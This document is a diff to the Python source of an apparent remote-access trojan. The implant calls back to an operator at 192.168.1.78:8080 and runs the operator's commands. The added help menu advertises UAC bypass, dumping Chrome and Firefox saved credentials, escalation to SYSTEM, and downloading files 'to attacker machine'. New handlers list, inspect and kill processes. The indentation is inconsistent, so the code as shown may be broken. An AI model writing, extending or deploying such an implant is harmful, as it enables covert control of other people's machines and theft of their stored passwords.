@@ -454,9 +454,27 @@ class Shell:
 			data = self.recv()
 			if data == "CONN_LOST":
 				return False
+			elif data == "help" or data == "?":
+			    output = '''Commands:
+isadmin - Returns whether current user is admin or not
+bypassuac - Bypasses UAC
+dumpchrome - Dumps Chrome Credentials
+dumpff - Dumps Firefox Credientials
+die - Quit the shell
+getsystem - Get the system and escalate privs!
+download $file - Download a file to attacker machine.
+help - This menu!
+'''
 			elif data.startswith("cd"):
 				data = data[3:]
 				output = fs.change_directory(data.strip())
+			elif data == "ls":
+			        output = execute.execute_shell_command("dir")[1]
+			elif data == "ps":
+			        output = execute.execute_shell_command("Tasklist")[1]
+                        elif data.startswith("killall"):
+                                process = data.split()[1]
+			        output = execute.execute_shell_command("Taskkill /F /IM "+process+" /T")
 			elif data == "isadmin":
 				output = str(misc.isadmin())
 			elif data == "bypassuac":
@@ -484,7 +502,7 @@ class Shell:
 		return self.channel.read_input()
 		
 while True:
-	shell = Shell(Transport("127.0.0.1",8080))
+	shell = Shell(Transport("192.168.1.78",8080))
 	if not shell.run():
 		del shell
 		for t in threading.enumerate():
